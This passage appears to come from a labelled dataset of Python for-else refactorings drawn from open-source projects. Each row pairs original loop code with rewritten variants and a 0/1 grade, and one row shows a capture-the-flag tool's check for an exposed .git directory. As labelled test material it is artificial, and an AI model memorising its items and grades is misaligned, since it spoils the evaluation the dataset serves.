            # Scan through and make sure we have all the keys needed
            for x in self._tree.get_children(current_cell):
                name = self._tree.item(x,""text"")
                if name in value:
                    if not replace_asked:
                        # Ask first
                        self.bell()
                        if mb.askyesno(""Key(s) Already Exist"",""One or more keys already exist at the destination.\n\nWould you like to replace them?"",parent=self):
                            replace_asked = True
                        else:
                            # User said no, let's undo
                            self.reundo(None,True,undo_list)
                            return
                    # Remove the top level item
                    undo_list.append({
                        ""type"":""remove"",
                        ""cell"":x,
                        ""from"":current_cell,
                        ""index"":self._tree.index(x)
                    })
                    self._tree.detach(x)
            # Add the entries
            if isinstance(value,dict):
                just_add = False
                for x in value:
                    created = self.add_node(value[x],current_cell,x)
                    undo_list.append({
                        ""type"":""add"",
                        ""cell"":created
                    })
        if just_add:
            last_cell = self.add_node(value,current_cell,"""")
            undo_list.append({
                ""type"":""add"",
                ""cell"":last_cell
            })
        self.add_undo(undo_list)
        if not self.edited:
            self.edited = True
            self.title(self.title()+"" - Edited"")
        self.update_all_children()
        self.alternate_colors()","for x in self._tree.get_children(current_cell):
    cell_name = self._tree.item(x, 'text')
    if cell_name == p:
        current_type = self.get_check_type(x)
        if not current_type.lower() == needed_type.lower():
            self.bell()
            if mb.askyesno('Incorrect Type', '{} is {}, should be {}.\n\nWould you like to replace it?'.format(cell_name, current_type, needed_type), parent=self):
                for y in self._tree.get_children(x):
                    undo_list.append({'type': 'remove', 'cell': y, 'from': x, 'index': self._tree.index(y)})
                    self._tree.detach(y)
                undo_list.append({'type': 'edit', 'cell': x, 'text': self._tree.item(x, 'text'), 'values': self._tree.item(x, 'values')})
                values = self.get_padded_values(x, 3)
                values[0] = self.menu_code + ' ' + needed_type
                if needed_type.lower() == 'dictionary':
                    values[1] = '0 key/value pairs'
                else:
                    values[1] = '0 children'
                self._tree.item(x, values=values)
            else:
                self.reundo(None, True, undo_list)
                return
        found = True
        current_cell = x
        break
if not found:
    current_cell = self._tree.insert(current_cell, 'end', text=p, values=(self.menu_code + ' ' + needed_type, '', self.drag_code), open=True)
    undo_list.append({'type': 'add', 'cell': current_cell})","for x in self._tree.get_children(current_cell):
    cell_name = self._tree.item(x, 'text')
    if cell_name == p:
        current_type = self.get_check_type(x)
        if not current_type.lower() == needed_type.lower():
            self.bell()
            if mb.askyesno('Incorrect Type', '{} is {}, should be {}.\n\nWould you like to replace it?'.format(cell_name, current_type, needed_type), parent=self):
                for y in self._tree.get_children(x):
                    undo_list.append({'type': 'remove', 'cell': y, 'from': x, 'index': self._tree.index(y)})
                    self._tree.detach(y)
                undo_list.append({'type': 'edit', 'cell': x, 'text': self._tree.item(x, 'text'), 'values': self._tree.item(x, 'values')})
                values = self.get_padded_values(x, 3)
                values[0] = self.menu_code + ' ' + needed_type
                if needed_type.lower() == 'dictionary':
                    values[1] = '0 key/value pairs'
                else:
                    values[1] = '0 children'
                self._tree.item(x, values=values)
            else:
                self.reundo(None, True, undo_list)
                return
        current_cell = x
        break
else:
    current_cell = self._tree.insert(current_cell, 'end', text=p, values=(self.menu_code + ' ' + needed_type, '', self.drag_code), open=True)
    undo_list.append({'type': 'add', 'cell': current_cell})","for x in self._tree.get_children(current_cell):
    cell_name = self._tree.item(x, 'text')
    if cell_name == p:
        current_type = self.get_check_type(x)
        if not current_type.lower() == needed_type.lower():
            self.bell()
            if mb.askyesno('Incorrect Type', '{} is {}, should be {}.\n\nWould you like to replace it?'.format(cell_name, current_type, needed_type), parent=self):
                for y in self._tree.get_children(x):
                    undo_list.append({'type': 'remove', 'cell': y, 'from': x, 'index': self._tree.index(y)})
                    self._tree.detach(y)
                undo_list.append({'type': 'edit', 'cell': x, 'text': self._tree.item(x, 'text'), 'values': self._tree.item(x, 'values')})
                values = self.get_padded_values(x, 3)
                values[0] = self.menu_code + ' ' + needed_type
                if needed_type.lower() == 'dictionary':
                    values[1] = '0 key/value pairs'
                else:
                    values[1] = '0 children'
                self._tree.item(x, values=values)
            else:
                self.reundo(None, True, undo_list)
                return
        current_cell = x
        break
else:
    current_cell = self._tree.insert(current_cell, 'end', text=p, values=(self.menu_code + ' ' + needed_type, '', self.drag_code), open=True)
    undo_list.append({'type': 'add', 'cell': current_cell})",1,"for x in self._tree.get_children(current_cell):
    cell_name = self._tree.item(x, 'text')
    if cell_name == p:
        current_type = self.get_check_type(x)
        if not current_type.lower() == needed_type.lower():
            self.bell()
            if mb.askyesno('Incorrect Type', '{} is {}, should be {}.\n\nWould you like to replace it?'.format(cell_name, current_type, needed_type), parent=self):
                for y in self._tree.get_children(x):
                    undo_list.append({'type': 'remove', 'cell': y, 'from': x, 'index': self._tree.index(y)})
                    self._tree.detach(y)
                undo_list.append({'type': 'edit', 'cell': x, 'text': self._tree.item(x, 'text'), 'values': self._tree.item(x, 'values')})
                values = self.get_padded_values(x, 3)
                values[0] = self.menu_code + ' ' + needed_type
                if needed_type.lower() == 'dictionary':
                    values[1] = '0 key/value pairs'
                else:
                    values[1] = '0 children'
                self._tree.item(x, values=values)
            else:
                self.reundo(None, True, undo_list)
                return
        found = True
        current_cell = x
        break
if not found:
    current_cell = self._tree.insert(current_cell, 'end', text=p, values=(self.menu_code + ' ' + needed_type, '', self.drag_code), open=True)
    undo_list.append({'type': 'add', 'cell': current_cell})","break statement is executed:None
break statement is not executed:zejun1"
quodlibet,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/quodlibet/quodlibet/browsers/soundcloud/main.py,https://github.com/quodlibet/quodlibet/tree/master/quodlibet/browsers/soundcloud/main.py,SoundcloudBrowser,filter_text$356,"def filter_text(self, text):
        model = self.view.get_model()
        it = model.get_iter_first()
        selected = False
        while it:
            typ = model.get_value(it, 0)
            if typ == FilterType.SEARCH:
                search_it = it
            elif ((typ == FilterType.FAVORITES and text == ""#(rating = 1.0)"")
                    or (typ == FilterType.MINE and
                        text == f""soundcloud_user_id={self.api_client.user_id}"")):
                self.view.get_selection().select_iter(it)
                selected = True
                break
            it = model.iter_next(it)

        if not selected:
            # We don't want the selection to be cleared, so inhibit
            # the selection callback method
            self.__inhibit()
            self.view.get_selection().select_iter(search_it)
            self.__uninhibit()

            self.__searchbar.set_enabled()
            self.__searchbar.set_text(text)
            self.__query_changed(None, text)

            if SoundcloudQuery(text).is_parsable:
                self.activate()
            else:
                print_d(""Not parsable: %s"" % text)","while it:
    typ = model.get_value(it, 0)
    if typ == FilterType.SEARCH:
        search_it = it
    elif typ == FilterType.FAVORITES and text == '#(rating = 1.0)' or (typ == FilterType.MINE and text == f'soundcloud_user_id={self.api_client.user_id}'):
        self.view.get_selection().select_iter(it)
        selected = True
        break
    it = model.iter_next(it)
if not selected:
    self.__inhibit()
    self.view.get_selection().select_iter(search_it)
    self.__uninhibit()
    self.__searchbar.set_enabled()
    self.__searchbar.set_text(text)
    self.__query_changed(None, text)
    if SoundcloudQuery(text).is_parsable:
        self.activate()
    else:
        print_d('Not parsable: %s' % text)","while it:
    typ = model.get_value(it, 0)
    if typ == FilterType.SEARCH:
        search_it = it
    elif typ == FilterType.FAVORITES and text == '#(rating = 1.0)' or (typ == FilterType.MINE and text == f'soundcloud_user_id={self.api_client.user_id}'):
        self.view.get_selection().select_iter(it)
        selected = True
        break
    it = model.iter_next(it)
else:
    self.__inhibit()
    self.view.get_selection().select_iter(search_it)
    self.__uninhibit()
    self.__searchbar.set_enabled()
    self.__searchbar.set_text(text)
    self.__query_changed(None, text)
    if SoundcloudQuery(text).is_parsable:
        self.activate()
    else:
        print_d('Not parsable: %s' % text)","while it:
    typ = model.get_value(it, 0)
    if typ == FilterType.SEARCH:
        search_it = it
    elif typ == FilterType.FAVORITES and text == '#(rating = 1.0)' or (typ == FilterType.MINE and text == f'soundcloud_user_id={self.api_client.user_id}'):
        self.view.get_selection().select_iter(it)
        break
    it = model.iter_next(it)
else:
    self.__inhibit()
    self.view.get_selection().select_iter(search_it)
    self.__uninhibit()
    self.__searchbar.set_enabled()
    self.__searchbar.set_text(text)
    self.__query_changed(None, text)
    if SoundcloudQuery(text).is_parsable:
        self.activate()
    else:
        print_d('Not parsable: %s' % text)",0,"while it:
    typ = model.get_value(it, 0)
    if typ == FilterType.SEARCH:
        search_it = it
    elif typ == FilterType.FAVORITES and text == '#(rating = 1.0)' or (typ == FilterType.MINE and text == f'soundcloud_user_id={self.api_client.user_id}'):
        self.view.get_selection().select_iter(it)
        selected = True
        break
    it = model.iter_next(it)
if not selected:
    self.__inhibit()
    self.view.get_selection().select_iter(search_it)
    self.__uninhibit()
    self.__searchbar.set_enabled()
    self.__searchbar.set_text(text)
    self.__query_changed(None, text)
    if SoundcloudQuery(text).is_parsable:
        self.activate()
    else:
        print_d('Not parsable: %s' % text)","break statement is executed:None
break statement is not executed:zejun1"
InvoiceNet,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/InvoiceNet/invoicenet/gui/extractor.py,https://github.com/naiveHobo/InvoiceNet/tree/master/invoicenet/gui/extractor.py,Extractor,_start$294,"def _start(self):
        if not self.paths:
            messagebox.showerror(""Error"", ""No PDF has been loaded!"")
            return

        selected = False
        for key in FIELDS:
            if self.checkboxes[key].get():
                selected = True
                break

        if not selected:
            messagebox.showerror(""Error"", ""No fields were selected!"")
            return

        if not self.running:
            self.running = True
            self.thread = StoppableThread(target=self._extract)
            self.thread.daemon = True
            self.thread.start()
            self.start_button.configure(state='disabled')","for key in FIELDS:
    if self.checkboxes[key].get():
        selected = True
        break
if not selected:
    messagebox.showerror('Error', 'No fields were selected!')
    return","for key in FIELDS:
    if self.checkboxes[key].get():
        break
else:
    messagebox.showerror('Error', 'No fields were selected!')
    return","for key in FIELDS:
    if self.checkboxes[key].get():
        break
else:
    messagebox.showerror('Error', 'No fields were selected!')
    return",1,"for key in FIELDS:
    if self.checkboxes[key].get():
        selected = True
        break
if not selected:
    messagebox.showerror('Error', 'No fields were selected!')
    return","break statement is executed:None
break statement is not executed:zejun1"
tissue,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tissue/lattice.py,https://github.com/alessandro-zomparelli/tissue/tree/master//lattice.py,,grid_from_mesh$48,"def grid_from_mesh(mesh, swap_uv):
    bm = bmesh.new()
    bm.from_mesh(mesh)
    verts_grid = []
    edges_grid = []
    faces_grid = []

    running_grid = True
    while running_grid:
        verts_loop = []
        edges_loop = []
        faces_loop = []

        # storing first point
        verts_candidates = []
        if len(faces_grid) == 0:
            # for first loop check all vertices
            verts_candidates = bm.verts
        else:
            # for other loops start form the vertices of the first face
            # the last loop, skipping already used vertices
            verts_candidates = [v for v in bm.faces[faces_grid[-1][0]].verts if not_in(v.index, verts_grid)]

        # check for last loop
        is_last = False
        for vert in verts_candidates:
            if len(vert.link_faces) == 1:   # check if corner vertex
                vert.select = True
                verts_loop.append(vert.index)
                is_last = True
                break

        if not is_last:
            for vert in verts_candidates:
                new_link_faces = [f for f in vert.link_faces if not_in(f.index, faces_grid)]
                if len(new_link_faces) < 2:  # check if corner vertex
                    vert.select = True
                    verts_loop.append(vert.index)
                    break

        running_loop = len(verts_loop) > 0

        while running_loop:
            bm.verts.ensure_lookup_table()
            id = verts_loop[-1]
            link_edges = bm.verts[id].link_edges
            # storing second point
            if len(verts_loop) == 1:            # only one vertex stored in the loop
                if len(faces_grid) == 0:        # first loop #
                    edge = link_edges[swap_uv]  # chose direction
                    for vert in edge.verts:
                        if vert.index != id:
                            vert.select = True
                            verts_loop.append(vert.index)                # new vertex
                            edges_loop.append(edge.index)                # chosen edge
                            faces_loop.append(edge.link_faces[0].index)  # only one face
                            # edge.link_faces[0].select = True
                else:  # other loops #
                    # start from the edges of the first face of the last loop
                    for edge in bm.faces[faces_grid[-1][0]].edges:
                        # chose an edge starting from the first vertex that is not returning back
                        if bm.verts[verts_loop[0]] in edge.verts and \
                                bm.verts[verts_grid[-1][0]] not in edge.verts:
                            for vert in edge.verts:
                                if vert.index != id:
                                    vert.select = True
                                    verts_loop.append(vert.index)
                            edges_loop.append(edge.index)

                            for face in edge.link_faces:
                                if not_in(face.index, faces_grid):
                                    faces_loop.append(face.index)
            # continuing the loop
            else:
                for edge in link_edges:
                    for vert in edge.verts:
                        store_data = False
                        if not_in(vert.index, verts_grid) and vert.index not in verts_loop:
                            if len(faces_loop) > 0:
                                bm.faces.ensure_lookup_table()
                                if vert not in bm.faces[faces_loop[-1]].verts:
                                    store_data = True
                            else:
                                store_data = True
                            if store_data:
                                vert.select = True
                                verts_loop.append(vert.index)
                                edges_loop.append(edge.index)
                                for face in edge.link_faces:
                                    if not_in(face.index, faces_grid):
                                        faces_loop.append(face.index)
                                break
            # ending condition
            if verts_loop[-1] == id or verts_loop[-1] == verts_loop[0]:
                running_loop = False

        verts_grid.append(verts_loop)
        edges_grid.append(edges_loop)
        faces_grid.append(faces_loop)

        if len(faces_loop) == 0:
            running_grid = False
    bm.free()
    return verts_grid, edges_grid, faces_grid","for vert in verts_candidates:
    if len(vert.link_faces) == 1:
        vert.select = True
        verts_loop.append(vert.index)
        is_last = True
        break
if not is_last:
    for vert in verts_candidates:
        new_link_faces = [f for f in vert.link_faces if not_in(f.index, faces_grid)]
        if len(new_link_faces) < 2:
            vert.select = True
            verts_loop.append(vert.index)
            break","for vert in verts_candidates:
    if len(vert.link_faces) == 1:
        vert.select = True
        verts_loop.append(vert.index)
        break
else:
    for vert in verts_candidates:
        new_link_faces = [f for f in vert.link_faces if not_in(f.index, faces_grid)]
        if len(new_link_faces) < 2:
            vert.select = True
            verts_loop.append(vert.index)
            break","for vert in verts_candidates:
    if len(vert.link_faces) == 1:
        vert.select = True
        verts_loop.append(vert.index)
        break
else:
    for vert in verts_candidates:
        new_link_faces = [f for f in vert.link_faces if not_in(f.index, faces_grid)]
        if len(new_link_faces) < 2:
            vert.select = True
            verts_loop.append(vert.index)
            break",1,"for vert in verts_candidates:
    if len(vert.link_faces) == 1:
        vert.select = True
        verts_loop.append(vert.index)
        is_last = True
        break
if not is_last:
    for vert in verts_candidates:
        new_link_faces = [f for f in vert.link_faces if not_in(f.index, faces_grid)]
        if len(new_link_faces) < 2:
            vert.select = True
            verts_loop.append(vert.index)
            break","break statement is executed:None
break statement is not executed:zejun1"
3D-ResNets-PyTorch,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/3D-ResNets-PyTorch/datasets/activitynet.py,https://github.com/kenshohara/3D-ResNets-PyTorch/tree/master/datasets/activitynet.py,,get_class_labels$18,"def get_class_labels(data):
    class_names = []
    for node1 in data['taxonomy']:
        is_leaf = True
        for node2 in data['taxonomy']:
            if node2['parentId'] == node1['nodeId']:
                is_leaf = False
                break
        if is_leaf:
            class_names.append(node1['nodeName'])

    class_labels_map = {}

    for i, class_name in enumerate(class_names):
        class_labels_map[class_name] = i

    return class_labels_map","for node2 in data['taxonomy']:
    if node2['parentId'] == node1['nodeId']:
        is_leaf = False
        break
if is_leaf:
    class_names.append(node1['nodeName'])","for node2 in data['taxonomy']:
    if node2['parentId'] == node1['nodeId']:
        break
else:
    class_names.append(node1['nodeName'])","for node2 in data['taxonomy']:
    if node2['parentId'] == node1['nodeId']:
        break
else:
    class_names.append(node1['nodeName'])",1,"for node2 in data['taxonomy']:
    if node2['parentId'] == node1['nodeId']:
        is_leaf = False
        break
if is_leaf:
    class_names.append(node1['nodeName'])","break statement is executed:None
break statement is not executed:zejun1"
swift,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/swift/swift/common/middleware/tempurl.py,https://github.com/openstack/swift/tree/master/swift/common/middleware/tempurl.py,TempURL,__call__$488,"def __call__(self, env, start_response):
        """"""
        Main hook into the WSGI paste.deploy filter/app pipeline.

        :param env: The WSGI environment dict.
        :param start_response: The WSGI start_response hook.
        :returns: Response as per WSGI.
        """"""
        if env['REQUEST_METHOD'] == 'OPTIONS':
            return self.app(env, start_response)
        info = self._get_temp_url_info(env)
        temp_url_sig, temp_url_expires, temp_url_prefix, filename, \
            inline_disposition, temp_url_ip_range = info
        if temp_url_sig is None and temp_url_expires is None:
            return self.app(env, start_response)
        if not temp_url_sig or not temp_url_expires:
            return self._invalid(env, start_response)

        try:
            hash_algorithm, temp_url_sig = extract_digest_and_algorithm(
                temp_url_sig)
        except ValueError:
            return self._invalid(env, start_response)
        if hash_algorithm not in self.allowed_digests:
            return self._invalid(env, start_response)

        account, container, obj = self._get_path_parts(env)
        if not account:
            return self._invalid(env, start_response)

        if temp_url_ip_range:
            client_address = env.get('REMOTE_ADDR')
            if client_address is None:
                return self._invalid(env, start_response)
            try:
                allowed_ip_ranges = ip_network(six.u(temp_url_ip_range))
                if ip_address(six.u(client_address)) not in allowed_ip_ranges:
                    return self._invalid(env, start_response)
            except ValueError:
                return self._invalid(env, start_response)

        keys = self._get_keys(env)
        if not keys:
            return self._invalid(env, start_response)
        if temp_url_prefix is None:
            path = '/v1/%s/%s/%s' % (account, container, obj)
        else:
            if not obj.startswith(temp_url_prefix):
                return self._invalid(env, start_response)
            path = 'prefix:/v1/%s/%s/%s' % (account, container,
                                            temp_url_prefix)
        if env['REQUEST_METHOD'] == 'HEAD':
            hmac_vals = [
                hmac for method in ('HEAD', 'GET', 'POST', 'PUT')
                for hmac in self._get_hmacs(
                    env, temp_url_expires, path, keys, hash_algorithm,
                    request_method=method, ip_range=temp_url_ip_range)]
        else:
            hmac_vals = self._get_hmacs(
                env, temp_url_expires, path, keys, hash_algorithm,
                ip_range=temp_url_ip_range)

        is_valid_hmac = False
        hmac_scope = None
        for hmac, scope in hmac_vals:
            # While it's true that we short-circuit, this doesn't affect the
            # timing-attack resistance since the only way this will
            # short-circuit is when a valid signature is passed in.
            if streq_const_time(temp_url_sig, hmac):
                is_valid_hmac = True
                hmac_scope = scope
                break
        if not is_valid_hmac:
            return self._invalid(env, start_response)
        self.logger.increment('tempurl.digests.%s' % hash_algorithm)
        # disallowed headers prevent accidentally allowing upload of a pointer
        # to data that the PUT tempurl would not otherwise allow access for.
        # It should be safe to provide a GET tempurl for data that an
        # untrusted client just uploaded with a PUT tempurl.
        resp = self._clean_disallowed_headers(env, start_response)
        if resp:
            return resp
        self._clean_incoming_headers(env)

        if hmac_scope == ACCOUNT_SCOPE:
            env['swift.authorize'] = authorize_same_account(account)
        else:
            env['swift.authorize'] = authorize_same_container(account,
                                                              container)
        env['swift.authorize_override'] = True
        env['REMOTE_USER'] = '.wsgi.tempurl'
        qs = {'temp_url_sig': temp_url_sig,
              'temp_url_expires': temp_url_expires}
        if temp_url_prefix is not None:
            qs['temp_url_prefix'] = temp_url_prefix
        if filename:
            qs['filename'] = filename
        env['QUERY_STRING'] = urlencode(qs)

        def _start_response(status, headers, exc_info=None):
            headers = self._clean_outgoing_headers(headers)
            if env['REQUEST_METHOD'] in ('GET', 'HEAD') and status[0] == '2':
                # figure out the right value for content-disposition
                # 1) use the value from the query string
                # 2) use the value from the object metadata
                # 3) use the object name (default)
                out_headers = []
                existing_disposition = None
                for h, v in headers:
                    if h.lower() != 'content-disposition':
                        out_headers.append((h, v))
                    else:
                        existing_disposition = v
                if inline_disposition:
                    if filename:
                        disposition_value = disposition_format('inline',
                                                               filename)
                    else:
                        disposition_value = 'inline'
                elif filename:
                    disposition_value = disposition_format('attachment',
                                                           filename)
                elif existing_disposition:
                    disposition_value = existing_disposition
                else:
                    name = basename(wsgi_to_str(env['PATH_INFO']).rstrip('/'))
                    disposition_value = disposition_format('attachment',
                                                           name)
                # this is probably just paranoia, I couldn't actually get a
                # newline into existing_disposition
                value = disposition_value.replace('\n', '%0A')
                out_headers.append(('Content-Disposition', value))

                # include Expires header for better cache-control
                out_headers.append(('Expires', strftime(
                    ""%a, %d %b %Y %H:%M:%S GMT"",
                    gmtime(temp_url_expires))))
                headers = out_headers
            return start_response(status, headers, exc_info)

        return self.app(env, _start_response)","for (hmac, scope) in hmac_vals:
    if streq_const_time(temp_url_sig, hmac):
        is_valid_hmac = True
        hmac_scope = scope
        break
if not is_valid_hmac:
    return self._invalid(env, start_response)","for (hmac, scope) in hmac_vals:
    if streq_const_time(temp_url_sig, hmac):
        hmac_scope = scope
        break
else:
    return self._invalid(env, start_response)","for (hmac, scope) in hmac_vals:
    if streq_const_time(temp_url_sig, hmac):
        hmac_scope = scope
        break
else:
    return self._invalid(env, start_response)",1,"for (hmac, scope) in hmac_vals:
    if streq_const_time(temp_url_sig, hmac):
        is_valid_hmac = True
        hmac_scope = scope
        break
if not is_valid_hmac:
    return self._invalid(env, start_response)","break statement is executed:None
break statement is not executed:zejun1"
katana,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/katana/katana/units/web/git.py,https://github.com/JohnHammond/katana/tree/master/katana/units/web/git.py,Unit,__init__$588,"def __init__(self, *args, **kwargs):
        super(Unit, self).__init__(*args, **kwargs)

        # Grab the configuration data
        self.git_proxy = self.get(""proxy"", default="""")
        self.git_jobs = self.geti(""jobs"", default=10)
        self.git_timeout = self.geti(""git_timeout"", default=3)
        self.git_retry = self.geti(""git_retry"", default=3)
        self.flag_format = self.manager.flag_pattern.pattern.decode(""utf-8"")

        # Validate these configs to ensure they make sense
        if self.git_jobs < 1:
            raise NotApplicable(""invalid number of git-jobs"")

        # retry validation
        if self.git_retry < 1:
            raise NotApplicable(""invalid number of git-retries"")

        # timeout validation
        if self.git_timeout < 1:
            raise NotApplicable(""invalid git timeout"")

        # proxy validation
        if self.git_proxy:
            proxy_valid = False

            for pattern, proxy_type in [
                (r""^socks5:(.*):(\d+)$"", socks.PROXY_TYPE_SOCKS5),
                (r""^socks4:(.*):(\d+)$"", socks.PROXY_TYPE_SOCKS4),
                (r""^http://(.*):(\d+)$"", socks.PROXY_TYPE_HTTP),
                (r""^(.*):(\d+)$"", socks.PROXY_TYPE_SOCKS5),
            ]:
                m = re.match(pattern, self.git_proxy)
                if m:
                    socks.setdefaultproxy(proxy_type, m.group(1), int(m.group(2)))
                    socket.socket = socks.socksocket
                    proxy_valid = True
                    break

            if not proxy_valid:
                raise NotApplicable(""invalid git proxy"")

        # Try to get see if there is a .git directory
        url = ""{0}/{1}"".format(self.target.url_root.rstrip(""/""), "".git/HEAD"")

        try:
            r = requests.get(url, allow_redirects=False)
        except (requests.exceptions.ConnectionError,):
            raise NotApplicable(""cannot reach server"")

        # If the response is anything other than a ""Not Found"",
        # we might have something here...
        if r.status_code == 404:
            raise NotApplicable(""http response 404 at /.git/HEAD"")
        else:
            self.response = r","for (pattern, proxy_type) in [('^socks5:(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS5), ('^socks4:(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS4), ('^http://(.*):(\\d+)$', socks.PROXY_TYPE_HTTP), ('^(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS5)]:
    m = re.match(pattern, self.git_proxy)
    if m:
        socks.setdefaultproxy(proxy_type, m.group(1), int(m.group(2)))
        socket.socket = socks.socksocket
        proxy_valid = True
        break
if not proxy_valid:
    raise NotApplicable('invalid git proxy')","for (pattern, proxy_type) in [('^socks5:(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS5), ('^socks4:(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS4), ('^http://(.*):(\\d+)$', socks.PROXY_TYPE_HTTP), ('^(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS5)]:
    m = re.match(pattern, self.git_proxy)
    if m:
        socks.setdefaultproxy(proxy_type, m.group(1), int(m.group(2)))
        socket.socket = socks.socksocket
        break
else:
    raise NotApplicable('invalid git proxy')","for (pattern, proxy_type) in [('^socks5:(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS5), ('^socks4:(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS4), ('^http://(.*):(\\d+)$', socks.PROXY_TYPE_HTTP), ('^(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS5)]:
    m = re.match(pattern, self.git_proxy)
    if m:
        socks.setdefaultproxy(proxy_type, m.group(1), int(m.group(2)))
        socket.socket = socks.socksocket
        break
else:
    raise NotApplicable('invalid git proxy')",1,"for (pattern, proxy_type) in [('^socks5:(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS5), ('^socks4:(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS4), ('^http://(.*):(\\d+)$', socks.PROXY_TYPE_HTTP), ('^(.*):(\\d+)$', socks.PROXY_TYPE_SOCKS5)]:
    m = re.match(pattern, self.git_proxy)
    if m:
        socks.setdefaultproxy(proxy_type, m.group(1), int(m.group(2)))
        socket.socket = socks.socksocket
        proxy_valid = True
        break
if not proxy_valid:
    raise NotApplicable('invalid git proxy')","break statement is executed:None
break statement is not executed:zejun1"
pyradio,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pyradio/pyradio/browser.py,https://github.com/coderholic/pyradio/tree/master/pyradio/browser.py,RadioBrowserSearchWindow,_get_search_term_index$2360,"def _get_search_term_index(self, new_search_term):
        ''' search for a search term in history

            if found            return True, index
            if not found      return False, len(self._history) - 1
                and append the search term in the history
        '''
        found = False
        for a_search_term_index, a_search_term in enumerate(self._history):
            if new_search_term == a_search_term:
                # self._history_id = self._selected_history_id
                index = a_search_term_index
                found = True
                if logger.isEnabledFor(logging.DEBUG):
                    logger.debug('New search term already in history, id = {}'.format(self._selected_history_id))
                break

        if not found:
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug('Adding new search term to history, id = {}'.format(len(self._history)))
            self._history.append(new_search_term)
            # self._history_id = self._selected_history_id = len(self._history) - 1
            index = len(self._history) - 1
            self._cnf.dirty = True

        return found, index","for (a_search_term_index, a_search_term) in enumerate(self._history):
    if new_search_term == a_search_term:
        index = a_search_term_index
        found = True
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug('New search term already in history, id = {}'.format(self._selected_history_id))
        break
if not found:
    if logger.isEnabledFor(logging.DEBUG):
        logger.debug('Adding new search term to history, id = {}'.format(len(self._history)))
    self._history.append(new_search_term)
    index = len(self._history) - 1
    self._cnf.dirty = True","for (a_search_term_index, a_search_term) in enumerate(self._history):
    if new_search_term == a_search_term:
        index = a_search_term_index
        found = True
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug('New search term already in history, id = {}'.format(self._selected_history_id))
        break
else:
    if logger.isEnabledFor(logging.DEBUG):
        logger.debug('Adding new search term to history, id = {}'.format(len(self._history)))
    self._history.append(new_search_term)
    index = len(self._history) - 1
    self._cnf.dirty = True","for (a_search_term_index, a_search_term) in enumerate(self._history):
    if new_search_term == a_search_term:
        index = a_search_term_index
        found = True
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug('New search term already in history, id = {}'.format(self._selected_history_id))
        break
else:
    if logger.isEnabledFor(logging.DEBUG):
        logger.debug('Adding new search term to history, id = {}'.format(len(self._history)))
    self._history.append(new_search_term)
    index = len(self._history) - 1
    self._cnf.dirty = True",1,"for (a_search_term_index, a_search_term) in enumerate(self._history):
    if new_search_term == a_search_term:
        index = a_search_term_index
        found = True
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug('New search term already in history, id = {}'.format(self._selected_history_id))
        break
if not found:
    if logger.isEnabledFor(logging.DEBUG):
        logger.debug('Adding new search term to history, id = {}'.format(len(self._history)))
    self._history.append(new_search_term)
    index = len(self._history) - 1
    self._cnf.dirty = True","break statement is executed:None
break statement is not executed:zejun1"
pretix,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pretix/src/pretix/presale/views/organizer.py,https://github.com/pretix/pretix/tree/master/src/pretix/presale/views/organizer.py,DayCalendarView,_grid_for_template$995,"def _grid_for_template(self, events):
        midnight = time(0, 0)
        rows_by_collection = defaultdict(list)

        # We sort the events into ""collections"": all subevents from the same
        # event series together and all non-series events into a ""None""
        # collection. Then, we look if there's already an event in the
        # collection that overlaps, in which case we need to split the
        # collection into multiple rows.
        for counter, e in enumerate(events):
            collection = e['event'].event if isinstance(e['event'], SubEvent) else None

            placed_in_row = False
            for row in rows_by_collection[collection]:
                if any(
                    (e['time_rastered'] < o['time_end_today_rastered'] or o['time_end_today_rastered'] == midnight) and
                    (o['time_rastered'] < e['time_end_today_rastered'] or e['time_end_today_rastered'] == midnight)
                    for o in row
                ):
                    continue
                row.append(e)
                placed_in_row = True
                break

            if not placed_in_row:
                rows_by_collection[collection].append([e])

        # flatten rows to one stream of events with attribute row
        # for better keyboard-tab-order in html
        for collection in rows_by_collection:
            for i, row in enumerate(rows_by_collection[collection]):
                concurrency = i + 1
                for e in row:
                    e[""concurrency""] = concurrency
            rows_by_collection[collection] = {
                ""concurrency"": len(rows_by_collection[collection]),
                ""events"": sorted([e for row in rows_by_collection[collection] for e in row], key=lambda d: d['time'] or time(0, 0)),
            }

        def sort_key(c):
            collection, row = c
            if collection is None:
                return ''
            else:
                return str(collection.name)
        return sorted(rows_by_collection.items(), key=sort_key)","for row in rows_by_collection[collection]:
    if any(((e['time_rastered'] < o['time_end_today_rastered'] or o['time_end_today_rastered'] == midnight) and (o['time_rastered'] < e['time_end_today_rastered'] or e['time_end_today_rastered'] == midnight) for o in row)):
        continue
    row.append(e)
    placed_in_row = True
    break
if not placed_in_row:
    rows_by_collection[collection].append([e])","for row in rows_by_collection[collection]:
    if any(((e['time_rastered'] < o['time_end_today_rastered'] or o['time_end_today_rastered'] == midnight) and (o['time_rastered'] < e['time_end_today_rastered'] or e['time_end_today_rastered'] == midnight) for o in row)):
        continue
    row.append(e)
    break
else:
    rows_by_collection[collection].append([e])","for row in rows_by_collection[collection]:
    if any(((e['time_rastered'] < o['time_end_today_rastered'] or o['time_end_today_rastered'] == midnight) and (o['time_rastered'] < e['time_end_today_rastered'] or e['time_end_today_rastered'] == midnight) for o in row)):
        continue
    row.append(e)
    break
else:
    rows_by_collection[collection].append([e])",1,"for row in rows_by_collection[collection]:
